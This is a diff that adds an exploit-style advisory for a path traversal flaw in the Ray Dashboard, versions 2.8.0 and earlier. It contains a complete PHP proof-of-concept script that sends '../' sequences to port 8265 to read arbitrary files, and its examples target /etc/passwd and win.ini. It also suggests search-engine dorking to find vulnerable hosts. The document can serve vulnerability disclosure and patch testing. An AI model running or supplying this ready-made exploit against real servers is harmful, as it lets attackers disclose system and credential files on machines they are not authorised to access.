@@ -1,0 +1,62 @@
+=============================================================================================================================================
+| # Title     : Ray ≤ 2.8.0 Path Traversal Leading to Local File Disclosure                                                                 |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 10 Fr(Pro) / browser : Mozilla firefox 135.0.1 (64 bits)                                                            |
+| # Vendor    : https://github.com/ray-project/ray                                                                                          |
+=============================================================================================================================================
+
+POC :
+
+[+] Dorking İn Google Or Other Search Enggine.
+
+[+] Code Description: A Path Traversal vulnerability was identified in versions prior to 2.8.1 of Ray affecting the Ray Dashboard service (default port 8265).
+                      The issue stems from improper validation and sanitization of user-supplied file paths within the static file handling mechanism. 
+                      By manipulating path traversal sequences (e.g., ../), an attacker may access files outside the intended static directory.
+ 
+[+] save code as poc.php .
+
+[+] USage : cmd => c:\www\test\php poc.php
+
+[+] PayLoad :
+
+<?php
+
+
+if ($argc < 3) {
+    echo "Usage: php ray_lfi.php <target_ip> <file_path>\n";
+    echo "Example Linux: php ray_lfi.php 192.168.1.10 /etc/passwd\n";
+    echo "Example Windows: php ray_lfi.php 192.168.1.10 C:/Windows/win.ini\n";
+    exit;
+}
+
+$target = $argv[1];
+$file = $argv[2];
+$port = 8265;
+
+$payload = "/static/js/" . str_repeat("../", 15) . $file;
+
+$url = "http://{$target}:{$port}{$payload}";
+
+echo "[*] Target: $url\n";
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $url);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+
+$response = curl_exec($ch);
+$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+if ($http_code === 200 && !empty($response)) {
+    echo "[+] File Retrieved Successfully:\n\n";
+    echo $response . "\n";
+} else {
+    echo "[-] Exploit failed or target not vulnerable.\n";
+}
+?>
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
